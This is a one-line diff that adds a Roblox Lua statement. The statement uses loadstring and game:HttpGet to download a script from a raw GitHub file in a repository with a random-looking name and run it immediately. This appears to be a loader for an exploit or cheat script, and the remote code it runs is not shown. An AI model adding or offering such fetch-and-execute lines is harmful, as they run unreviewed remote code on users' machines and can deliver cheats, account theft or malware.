@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RetroGamesAlt/Fsdifbsrbsfribf/main/Gfx"))()
